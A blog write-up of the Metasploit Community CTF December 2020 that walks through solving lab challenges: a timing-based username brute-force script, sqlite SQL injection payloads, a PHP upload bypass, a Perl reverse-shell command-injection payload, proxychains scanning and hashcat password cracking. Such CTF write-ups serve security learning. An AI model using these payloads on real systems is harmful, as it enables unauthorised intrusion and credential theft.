+++
title = "Metasploit Community CTF December 2020 WriteUp"
date = "2020-12-07"
author = ""
cover = ""
tags = ["CTF"]
keywords = ["", ""]
description = ""
showFullContent = false
+++

<!--more-->

# Summary
Over the weekend I participated in [Metasploit Community December CTF](https://ctftime.org/event/1200) by Rapid7 
with team [fr334aks](https://twitter.com/fr334aks). We ended up getting position 57/413. The CTF was meant to be beginner-friendly. 

# Intro
Teams are provided with their own instance of a kali box which is public facing to act as a jump host to reach
an ubuntu VM which hosts the challenges.

On the ubuntu VM there are 20 open ports for each challenge. To complete a challenge you need to find a challenge 
flag and submit the MD5 checksum of the PNG to get points.

I decided to tunnel all connections to the victim through ssh with sshuttle using the below command:

```bash
sshuttle -r kali@52.90.96.4 -e "ssh -i metasploit_ctf_kali_ssh_key.pem" 172.15.18.101/32
```
# Challenges:

## 4 of Hearts

After tunneling the connections to the Ubuntu VM the first flag is on port 80, ```http://172.15.18.101/4_of_hearts.png```.

**Flag**:

{{< image src="/img/metasploitctf2020/4_of_hearts.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

## 6 of Hearts

{{< image src="/img/metasploitctf2020/port6868.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

There is a photos website running on port 6868. There is a functionality to sign up that creates directories based on a user's 
initials of their names. 

On signing up we first get the notes directory. 

{{< image src="/img/metasploitctf2020/port6868_1.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

On the home page, there are images which are hosted under files directory with different users initials.

{{< image src="/img/metasploitctf2020/port6868_2.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

Since there's no authentication we can try look at notes for each of the discovered users.

**BD**:

{{< image src="/img/metasploitctf2020/port6868_4.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

**TW**:

{{< image src="/img/metasploitctf2020/port6868_5.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

**MC**:

{{< image src="/img/metasploitctf2020/port6868_6.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

From the above notes we can tell that there's a site admin whose name is *Beth Ulysses Denise Donnoly Yager*, this creates the initials
*BUDDY*. 

We can then get the flag with these initials at the url ```http://172.15.18.101:6868/files/BUDDY/2```.

**Flag**:

{{< image src="/img/metasploitctf2020/6_of_hearts.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

# 3 of Spades

To solve this one we are required to identify a valid username aside from guest. When you submit guest which is a valid username, the 
request takes about 5 seconds to complete but if you supply a non-valid username it takes less than a second. The password doesn't 
matter.

{{< image src="/img/metasploitctf2020/port8080.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

I created a python script to bruteforce the username with a wordlist:

```py
import requests

url = "http://172.15.18.101:8080/login.php"

user = "guest"
f = open('/usr/share/seclists/Usernames/cirt-default-usernames.txt','r')
users = f.readlines()
f.close()
def guess(username):
    print("Testing username: " + username +"...")
    data = {"username":username,"password":"test"}
    r = requests.post(url, data=data)
    response_time = r.elapsed.total_seconds()

    if response_time > 4:
        print("Valid user found: " + username)
        exit()

for i in users:
    guess(i.strip())
```
It found the user to be demo:

{{< image src="/img/metasploitctf2020/port8080_2.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

When we submit it we get the url to the flag, ```http://172.15.18.101:8080/a3lk3d939d993201ld.png```.

{{< image src="/img/metasploitctf2020/port8080_1.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}


**Flag**:

{{< image src="/img/metasploitctf2020/3_of_spades.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

## 2 of Spades

There's a website with the ability to search for reviews on port 9001.

{{< image src="/img/metasploitctf2020/port9001.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

First thing to check with search functionality is SQLi, after adding a quote ```'``` we get a sqlite3 error confirming presence of sqli:

{{< image src="/img/metasploitctf2020/port9001_1.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

Using this payload we can get the structure of the db:

```
overwatch' union select 1,sql,3 FROM sqlite_master;-- -
```

{{< image src="/img/metasploitctf2020/port9001_2.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

Then we can extract the link to the flag with this payload:

```
overwatch' union select 1,flag,link FROM hidden-- -
```

{{< image src="/img/metasploitctf2020/port9001_3.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

**Flag**:

{{< image src="/img/metasploitctf2020/2_of_spades.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

## 8 of Hearts

On port 4545, We are provided with 2 files:

{{< image src="/img/metasploitctf2020/port4545.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

When you run the elf binary it asks for buffalo and if you give one it asks for more.

{{< image src="/img/metasploitctf2020/port4545_1.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

All we needed to do was guess how many buffaloes it needed, the exact value was between 100 and 200.

{{< image src="/img/metasploitctf2020/port4545_2.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

**Flag**:

{{< image src="/img/metasploitctf2020/8_of_hearts.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

## 8 of Spades

On port 1080 a socks5 proxy is running on this port without any authentication. We can edit ```/etc/proxychains.conf``` and add this server as a socks5
proxy server.

```
socks5  172.15.18.101 1080
```
Next we need to discover open ports that we can access through the proxy. Port scanning over a proxy can be really slow, therefore, lets
check the top 100 ports first.

```
proxychains nmap -sT --top-ports=100 127.0.0.1 
```
Nmap discovers port 22 and 8000 open.

Port 8000 is a web server hosting our flag:
```
proxychains curl 127.0.0.1:8000
```

{{< image src="/img/metasploitctf2020/port1080.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

**Flag**:

{{< image src="/img/metasploitctf2020/8_of_spades.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

## Red Joker

On port 9007, we get a zip file.

{{< image src="/img/metasploitctf2020/port9007.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

Only thing needed is to extract it:

```
7z x red_joker.zip
```

**Flag**:

{{< image src="/img/metasploitctf2020/joker_red.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

## 6 of Diamonds

On port 8200, there's a website that we can upload images.

{{< image src="/img/metasploitctf2020/port8200.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

It only allows jpeg and png files by checking mime type and file extension. We can bypass this restriction with a few tricks.

We can create a php file with a valid jpeg mime type with this command:

```
echo -n -e '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01' > shell.php
```

{{< image src="/img/metasploitctf2020/port8200_3.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

Then we can intercept the request in burp suite and change the extension and add our php exploit code.

{{< image src="/img/metasploitctf2020/port8200_2.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

We can successfully execute commands and get the location of the flag.

{{< image src="/img/metasploitctf2020/port8200_4.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

Flag was found at ```http://172.15.18.101:8200/157a7640-0fa4-11eb-adc1-0242ac120002/6_of_diamonds.png```.

{{< image src="/img/metasploitctf2020/6_of_diamonds.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

## Queen of Spades

On port 8202, we have another website with barely any functionality to interact with.

{{< image src="/img/metasploitctf2020/port8202.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

But when we look at burp where we are proxying http traffic, there is some communication to an api which looks very much like
graphql.

{{< image src="/img/metasploitctf2020/port8202_1.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

A common misconfiguration to check is if introspection is enabled on the endpoint.

When we supply an introspection payload (you can use the ones from [payloadallthethings repo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection)) it works and we get the schema.

{{< image src="/img/metasploitctf2020/port8202_3.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

To understand the result, we can easily visualize this at https://apis.guru/graphql-voyager/

{{< image src="/img/metasploitctf2020/port8202_2.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

With this structure we can easily make our queries.

{{< image src="/img/metasploitctf2020/port8202_4.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

The below query gives the location of the flag.

{{< image src="/img/metasploitctf2020/port8202_5.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

**Flag**:

{{< image src="/img/metasploitctf2020/queen_of_spades.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

## 2 of Hearts

On port 9000, there's another website similar to the one port 9001 but this one has a different way in which it handles searches. When we search using
just a single character a, the first result is interesting as it looks like a folder in a terminal.

{{< image src="/img/metasploitctf2020/port9000.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

This could mean our input is being used to construct a shell command. We can try getting a reverse shell using this reverse shell payload:
```perl
$(perl -e 'use Socket;$i="172.15.18.100";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};')
```

We successfully get a reverse shell.

{{< image src="/img/metasploitctf2020/port9000_1.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

The vulnerable code is using the find command:

{{< image src="/img/metasploitctf2020/port9000_2.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

**Flag**:

{{< image src="/img/metasploitctf2020/2_of_hearts.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

## Black Joker

{{< image src="/img/metasploitctf2020/port8123.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

The web app here has two visible functionalities:

{{< image src="/img/metasploitctf2020/port8123_2.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

When we try to sign up, we get the response that no new members can signup. When trying to look at the request in burp suite, there was
none. Therefore it must be a frontend response.

{{< image src="/img/metasploitctf2020/port8123_1.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

sign-up.js:

{{< image src="/img/metasploitctf2020/port8123_3.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

Looking at the forgotten your password functionality, we can supply an email. The home page contains this email: admin@example.com.

{{< image src="/img/metasploitctf2020/port8123_4.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

This gets us a hint but it's not enough information. When we look at the full request in burp, there was actually more information
sent back that wasn't displayed.

{{< image src="/img/metasploitctf2020/port8123_5.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

From the js file we gather that the site accepts passwords between 9 and 14 chars long, which are should have only a-z and 0-9 characters.
Having a hash and the beginning of the password we can generate a wordlist and crack the hash.

```bash
crunch 0 5 0123456789abcdefghijklmnopqrstuvwxyz > temp
sed -e 's/^/ihatesalt/' temp > wordlist.txt
hashcat -m 0 '7f35f82c933186704020768fd08c2f69' wordlist.txt
```

Recovered Password: ihatesaltalot7

{{< image src="/img/metasploitctf2020/port8123_6.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

Supplying the email and password to /admin, we get the flag.

{{< image src="/img/metasploitctf2020/port8123_7.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

**Flag**:

{{< image src="/img/metasploitctf2020/black_joker.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

## 4 of Clubs

Port 8092:

{{< image src="/img/metasploitctf2020/port8092.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

For this challenge, we were able to bypass the hash check by supplying the password as an empty array.

{{< image src="/img/metasploitctf2020/port8092_1.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

**Flag**:

{{< image src="/img/metasploitctf2020/4_of_clubs.png" alt="metasploit_ctf_2020" position="center" style="border-radius: 8px;" >}}

# Conclusion

This was a very nice ctf to brush up on some basic concepts. As we didn't solve all challenges, that means we still have some
things to learn.

Follow our team twitter account: [fr334aks](https://twitter.com/fr334aks)

Twitter: [ikuamike](https://twitter.com/ikuamike)

Github: [ikuamike](https://github.com/ikuamike)
